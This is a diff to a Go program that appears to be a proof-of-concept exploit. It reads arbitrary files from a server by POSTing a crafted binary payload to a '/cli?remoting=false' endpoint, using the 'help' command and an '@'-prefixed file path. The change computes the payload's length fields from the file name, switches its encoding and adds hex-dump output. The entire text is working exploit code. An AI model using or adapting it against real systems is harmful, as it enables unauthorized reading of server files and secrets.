@@ -3,7 +3,9 @@ package main
 import (
 	"bytes"
 	"crypto/tls"
+	"encoding/hex"
 	"errors"
+	"fmt"
 	"github.com/google/uuid"
 	"io"
 	"log"
@@ -34,7 +36,11 @@ func main() {
 }
 
 func requestFile(rootUrl string, targetFile string, sessionId string) error {
-	payload := "\x00\x00\x00\x06\x00\x00\x04help\x00\x00\x00\x0e\x00\x00\x0c@" + targetFile + "\x00\x00\x00\x05\x02\x00\x03GBK\x00\x00\x00\x07\x01\x00\x05en_US\x00\x00\x00\x00\x03"
+	targetFile = "@" + targetFile
+	targetFileNameLength := len(targetFile)
+	payload := "\x00\x00\x00\x06\x00\x00\x04help\x00\x00\x00" + string(byte(targetFileNameLength+2)) + "\x00\x00" + string(byte(targetFileNameLength)) + targetFile + string([]byte{0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x03, 0x6e, 0x6f, 0x74, 0x00, 0x00, 0x00, 0x07, 0x02, 0x00, 0x05, 0x55, 0x54, 0x46, 0x2d, 0x38, 0x00, 0x00, 0x00, 0x07, 0x01, 0x00, 0x05, 0x65, 0x6e, 0x5f, 0x55, 0x53, 0x00, 0x00, 0x00, 0x00, 0x03})
+	fmt.Println(hex.Dump([]byte(payload)))
+	log.Println(len(payload))
 	req, err := http.NewRequest(http.MethodPost, rootUrl+"/cli?remoting=false", bytes.NewBufferString(payload))
 	if err != nil {
 		return err
